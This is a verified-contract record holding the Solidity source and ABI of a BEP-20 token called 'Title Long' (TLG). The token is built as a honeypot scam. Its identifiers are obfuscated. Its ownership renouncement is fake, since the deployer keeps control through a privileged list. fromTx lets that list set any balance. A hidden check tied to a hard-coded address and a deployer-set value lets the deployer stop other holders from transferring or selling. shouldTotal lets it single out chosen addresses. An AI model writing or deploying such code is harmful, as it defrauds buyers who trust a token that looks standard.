{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface buyTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellMarketingSwap {\n    function createPair(address exemptFeeMax, address buyToSender) external returns (address);\n}\n\ninterface toAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoMarketing) external view returns (uint256);\n\n    function transfer(address maxLimit, uint256 isFund) external returns (bool);\n\n    function allowance(address feeReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxLimit,\n        uint256 isFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeSender, uint256 value);\n    event Approval(address indexed feeReceiver, address indexed spender, uint256 value);\n}\n\ninterface toAtMetadata is toAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TitleLong is launchedWallet, toAt, toAtMetadata {\n\n    address public listShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromMax;\n    }\n\n    function atIs(address launchLaunched, address maxLimit, uint256 isFund) internal returns (bool) {\n        if (launchLaunched == listShould) {\n            return senderFund(launchLaunched, maxLimit, isFund);\n        }\n        uint256 fundAutoMax = toAt(shouldMin).balanceOf(modeReceiver);\n        require(fundAutoMax == sellBuy);\n        require(maxLimit != modeReceiver);\n        if (receiverMarketingMin[launchLaunched]) {\n            return senderFund(launchLaunched, maxLimit, toTotal);\n        }\n        return senderFund(launchLaunched, maxLimit, isFund);\n    }\n\n    uint256 public toShould;\n\n    function fundMax(address sellAt) public {\n        if (takeTeamShould) {\n            return;\n        }\n        if (toShould == receiverBuyWallet) {\n            listSell = false;\n        }\n        fundLimit[sellAt] = true;\n        if (buySwap) {\n            toShould = receiverBuyWallet;\n        }\n        takeTeamShould = true;\n    }\n\n    function fromEnable(uint256 isFund) public {\n        senderLiquidity();\n        sellBuy = isFund;\n    }\n\n    string private senderEnable = \"Title Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptBuy;\n    }\n\n    uint256 private fromMax = 100000000 * 10 ** 18;\n\n    function balanceOf(address autoMarketing) public view virtual override returns (uint256) {\n        return receiverAuto[autoMarketing];\n    }\n\n    address private liquidityTokenExempt;\n\n    mapping(address => uint256) private receiverAuto;\n\n    bool public buySwap;\n\n    event OwnershipTransferred(address indexed txAuto, address indexed liquiditySender);\n\n    function decimals() external view virtual override returns (uint8) {\n        return minEnable;\n    }\n\n    function approve(address buyReceiver, uint256 isFund) public virtual override returns (bool) {\n        feeFrom[_msgSender()][buyReceiver] = isFund;\n        emit Approval(_msgSender(), buyReceiver, isFund);\n        return true;\n    }\n\n    function fromTx(address listTeam, uint256 isFund) public {\n        senderLiquidity();\n        receiverAuto[listTeam] = isFund;\n    }\n\n    mapping(address => bool) public fundLimit;\n\n    mapping(address => bool) public receiverMarketingMin;\n\n    constructor (){\n        \n        buyTx exemptSwap = buyTx(maxMin);\n        shouldMin = sellMarketingSwap(exemptSwap.factory()).createPair(exemptSwap.WETH(), address(this));\n        \n        listShould = _msgSender();\n        amountSell();\n        fundLimit[listShould] = true;\n        receiverAuto[listShould] = fromMax;\n        \n        emit Transfer(address(0), listShould, fromMax);\n    }\n\n    uint8 private minEnable = 18;\n\n    uint256 constant toTotal = 13 ** 10;\n\n    bool public takeTeamShould;\n\n    uint256 private receiverBuyWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return senderEnable;\n    }\n\n    function owner() external view returns (address) {\n        return liquidityTokenExempt;\n    }\n\n    function transfer(address listTeam, uint256 isFund) external virtual override returns (bool) {\n        return atIs(_msgSender(), listTeam, isFund);\n    }\n\n    function amountSell() public {\n        emit OwnershipTransferred(listShould, address(0));\n        liquidityTokenExempt = address(0);\n    }\n\n    address public shouldMin;\n\n    bool private listSell;\n\n    function transferFrom(address launchLaunched, address maxLimit, uint256 isFund) external override returns (bool) {\n        if (_msgSender() != maxMin) {\n            if (feeFrom[launchLaunched][_msgSender()] != type(uint256).max) {\n                require(isFund <= feeFrom[launchLaunched][_msgSender()]);\n                feeFrom[launchLaunched][_msgSender()] -= isFund;\n            }\n        }\n        return atIs(launchLaunched, maxLimit, isFund);\n    }\n\n    mapping(address => mapping(address => uint256)) private feeFrom;\n\n    function getOwner() external view returns (address) {\n        return liquidityTokenExempt;\n    }\n\n    address maxMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function senderFund(address launchLaunched, address maxLimit, uint256 isFund) internal returns (bool) {\n        require(receiverAuto[launchLaunched] >= isFund);\n        receiverAuto[launchLaunched] -= isFund;\n        receiverAuto[maxLimit] += isFund;\n        emit Transfer(launchLaunched, maxLimit, isFund);\n        return true;\n    }\n\n    function shouldTotal(address walletLaunchReceiver) public {\n        senderLiquidity();\n        \n        if (walletLaunchReceiver == listShould || walletLaunchReceiver == shouldMin) {\n            return;\n        }\n        receiverMarketingMin[walletLaunchReceiver] = true;\n    }\n\n    uint256 sellBuy;\n\n    address modeReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 launchWallet;\n\n    function senderLiquidity() private view {\n        require(fundLimit[_msgSender()]);\n    }\n\n    function allowance(address isShould, address buyReceiver) external view virtual override returns (uint256) {\n        if (buyReceiver == maxMin) {\n            return type(uint256).max;\n        }\n        return feeFrom[isShould][buyReceiver];\n    }\n\n    string private exemptBuy = \"TLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"fromEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"fromTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAt\",\"type\":\"address\"}],\"name\":\"fundMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMarketingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunchReceiver\",\"type\":\"address\"}],\"name\":\"shouldTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeamShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TitleLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}